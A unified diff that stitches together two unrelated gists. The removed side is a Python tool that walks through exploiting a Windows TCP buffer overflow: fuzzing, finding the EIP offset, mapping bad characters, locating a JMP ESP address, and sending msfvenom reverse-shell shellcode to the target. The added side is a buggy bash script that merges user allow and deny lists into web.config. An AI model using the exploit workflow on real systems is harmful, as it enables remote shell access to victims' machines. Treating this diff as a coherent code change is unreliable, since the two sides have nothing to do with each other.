@@ -1,174 +1,82 @@
-#date: 2023-11-10T16:46:47Z
-#url: https://api.github.com/gists/710a0710e2f7eea45154cbdcf9d7f972
-#owner: https://api.github.com/users/wilco375
+#date: 2023-11-13T16:52:11Z
+#url: https://api.github.com/gists/81313568dea0fa76923d22d64f63aa1f
+#owner: https://api.github.com/users/monyslim
 
-#!/usr/bin/python
+#!/bin/bash
+UsersAllowedInv="allowed_users_inventory.txt"
+UsersNotAllowedInv="not_allowd_users_inventory.txt"
 
-# Script to help with the exploitation of a buffer overflow in a TCP command of a Windows binary to get a reverse shell
-# Used in combination with Immunity Debugger and Mona, and will guide you through the steps of finding the offset, bad characters, jump point and generating shellcode 
+ConfigFile="web.config"
 
-import sys, socket
-from time import sleep
-import subprocess
-import os
+TempConfigFile="temp_web.config"
 
-if len(sys.argv) < 4:
-    print("Usage: python3 buffer-overflow.py <target-ip:port> <local-ip:listener-port> <vulnerable-command>")
-    sys.exit()
+if [[ -f $TempConfigFile ]]
+then
+    rm -f $TempConfigFile
+fi
 
-ip = sys.argv[1].split(':')[0]
-port = int(sys.argv[1].split(':')[1])
-local_ip = sys.argv[2].split(':')[0]
-local_port = int(sys.argv[2].split(':')[1])
-prefix = sys.argv[3] + ' '
+touch $TempConfigFile
 
-timeout = 5
+Allowed_Users_String=""
 
-def send_payload(payload, recv_after_send=False) -> bool:
-    if isinstance(payload, str):
-        payload = payload.encode('latin-1')
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(timeout)
-            s.connect((ip, port))
-            s.recv(1024)
-            s.send(payload)
-            if recv_after_send:
-                s.recv(1024)
-            return True
-    except:
-        return False
+allowed_users_line=$( cat $ConfigFile | grep "UsersAllowed" )
+ if [[ $allowed_users_line ]]
+    then
+        Allowed_users_String="$allowed_users_line,"
+    fi
 
-def fuzz():
-    print('=== Finding approxmimate offset ===')
-    buffer = 'A' * 100
+while read -r line
+do 
+    Allowed_users_String+="$line,"
     
-    input('[!] Please make sure the target is running and press enter to continue...')
+done < $UsersAllowedInv
 
-    while True:
-        print(f"[+] Sending payload of size {len(buffer)}...")
-        if not send_payload(prefix + buffer, True):
-            print("The fuzzing crashed at %s bytes" % str(len(buffer)))
-            return len(buffer)
-        
-        sleep(0.5)
-        buffer = buffer + "A"*100
+echo $Allowed_users_String
 
-def find_offset(approx_offset):
-    print('\n=== Finding exact offset ===')
-    pattern = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(approx_offset)]).decode('utf-8').strip()
 
-    input('[!] Please make sure the target is running in Immunity Debugger and press enter to continue...')
 
-    print(f"[+] Sending payload...")
-    send_payload(prefix + pattern)
 
-    eip = input("[!] Please enter the hex value of EIP: ")
+Not_Allowed_Users_String=""
 
-    if eip.strip() == '':
-        print("[-] EIP value not provided, retrying")
-        return False
+not_allowed_users_line=$( cat $ConfigFile | grep "UsersNotAllowed" )
+ if [[ $not_allowed_users_line ]]
+    then
+        Not_Allowed_Users_String="$not_allowed_users_line"
+    fi
 
-    offset = int(subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-l', str(approx_offset), '-q', eip]).decode('utf-8').strip().split(' ')[-1])
 
-    print(f"[!] EIP offset: {offset}")
 
-    return offset
-
-def bad_chars(offset, badchars=b'\x00'):
-    print('\n=== Finding bad characters ===')
+while read -r not_allowed_line
+do 
+    Not_Allowed_Users_String+="$not_allowed_line,"
     
-    buffer = 'A' * offset
-    buffer += 'BBBB'
-    buffer += ''.join([chr(char) for char in range(0,256) if char not in badchars])
+done < $UsersNotAllowedInv
 
-    input('[!] Please make sure the target is running in Immunity Debugger and press enter to continue...')
+echo $Not_Allowed_Users_String
 
-    print(f"[+] Sending payload...")
-    send_payload(prefix + buffer)
 
-    print("[+] You can use the following mona commands to find bad characters:")
-    print('!mona config -set workingfolder c:\mona')
-    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
-    print(f'!mona bytearray -cpb "{badchars_str}"')
-    print('!mona compare -f C:\\mona\\bytearray.bin -a <ESP address>')
 
-    newbadchars = input("[!] Please enter the (new) bad characters found by mona (if any), e.g. \\x12\\x4b: ").strip()
-    newbadchars = bytes.fromhex(newbadchars.strip().replace('\\x', ''))
+Not_allowed_String=""
 
-    # For each badchars not in newbadchars, add it to badchars
-    for char in badchars[::-1]:
-        if char not in newbadchars:
-            newbadchars += bytes([char])
+# users_allowed_current_config_line=$(cat $ConfigFile | grep "UsersAllowed")
+# users_not_allowed_current_config_line=$(cat $ConfigFile | grep "UsersNotAllowed")
 
-    # Sort the badchars
-    newbadchars = sorted(newbadchars)
+## loop through the config file again
+while read -r config_line
+do
+    users_allowed_current_config_line=$(echo $config_line | grep "UsersAllowed")
+    users_not_allowed_current_config_line=$(echo $config_line | grep "UsersNotAllowed")
+
+    if [[ ! $users_allowed_current_config_line && ! $users_not_allowed_current_config_line ]]
+    then
+        echo $config_line >> $TempConfigFile
+    fi
     
-    return newbadchars
 
-def jump_point(badchars):
-    print("\n=== Finding jump point ===")
-    print("[+] You can use the following mona command to find a jump point:")
-    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
-    print(f'!mona jmp -r esp -cpb "{badchars_str}"')
+done < $ConfigFile
 
-    jumppoint = input("[!] Please enter the jump point address as hex: ").strip()
 
-    return jumppoint
+## write the remaining to temp file
+echo $Not_Allowed_Users_String >> $TempConfigFile
+echo $Allowed_users_String >> $TempConfigFile
 
-def shellcode(offset, badchars, jumppoint):
-    print('\n=== Generating and sending shellcode ===')
-
-    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
-    shellcode = subprocess.check_output(['msfvenom', '-p', 'windows/shell_reverse_tcp', f'LHOST={local_ip}', f'LPORT={local_port}', 'EXITFUNC=thread', '-f', 'raw', '-a', 'x86', '-b', badchars_str])
-    # Payload = command + padding to offset + jump point + NOP sled + shellcode
-    payload = prefix.encode('latin-1') + (b'A' * offset) + bytes.fromhex(jumppoint)[::-1] + (b'\x90' * 32) + shellcode
-
-    print('[!] Outputting exploit to exploit.py')
-    filename = 'exploit.py'
-    if os.path.exists('exploit.py'):
-        filename = input('exploit.py already exists, please enter a filename: ')
-    with open(filename, 'w') as f:
-        f.write('#!/usr/bin/python\n\n')
-        f.write('import sys, socket\n\n')
-        f.write(f"ip = '{ip}'\n")
-        f.write(f"port = {port}\n")
-        payload_str = ''.join(['\\x%02x' % char for char in payload])
-        f.write(f"payload = '{payload_str}'\n\n")
-        f.write('try:\n')
-        f.write('    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n')
-        f.write('        s.connect((ip, port))\n')
-        f.write('        s.send(payload.encode(\'latin-1\'))\n')
-        f.write('        sys.exit()\n')
-        f.write('except:\n')
-        f.write('    print("Error connecting to server")\n')
-        f.write('    sys.exit()\n')
-    
-    input('[!] Please make sure the target and your listener are running and press enter to send shellcode...')
-
-    send_payload(payload)
-
-approx_offset = fuzz()
-
-while True:
-    offset = find_offset(approx_offset)
-    if offset is not False:
-        break
-
-badchars = b'\x00'
-while True:
-    newbadchars = bad_chars(offset, badchars)
-    
-    if newbadchars != badchars:
-        result = input("[!] Do you want to validate the bad characters? (y/n): ").strip().lower()
-        if result == 'n':
-            break
-    else:
-        break
-
-badchars_str = ''.join(['\\x%02x' % char for char in badchars])
-print(f"[!] Bad characters: {badchars_str}")
-
-jumppoint = jump_point(badchars)
-
-shellcode(offset, badchars, jumppoint)
